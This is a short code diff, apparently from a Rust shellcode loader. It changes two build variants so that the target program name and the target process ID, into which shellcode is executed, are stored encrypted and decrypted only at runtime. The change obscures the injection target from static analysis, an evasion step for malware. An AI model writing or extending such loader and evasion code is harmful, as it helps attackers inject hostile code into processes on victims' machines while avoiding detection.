@@ -67,8 +67,10 @@ fn main() {
         
         #[cfg(feature = "pattern2")] 
         {
-            let target_program = env!("RSL_TARGET_PROGRAM");
-            if let Err(e) = exec(shellcode_ptr as usize, _shellcode_len, target_program) {
+            use utils::simple_decrypt;
+            let target_program = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PROGRAM"));
+
+            if let Err(e) = exec(shellcode_ptr as usize, _shellcode_len, target_program.as_str()) {
                 println!("{} {}", "Failed to execute:", e);
                 process::exit(1);
             }
@@ -76,7 +78,9 @@ fn main() {
         
         #[cfg(feature = "pattern3")]
         {
-            let pid: usize = env!("RSL_TARGET_PID").parse().unwrap_or(0);
+            use utils::simple_decrypt;
+            let pid: usize = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PID")).parse().unwrap_or(0);
+            
             if let Err(e) = exec(shellcode_ptr as usize, _shellcode_len, pid) {
                 println!("{} {}", "Failed to execute:", e);
                 process::exit(1);
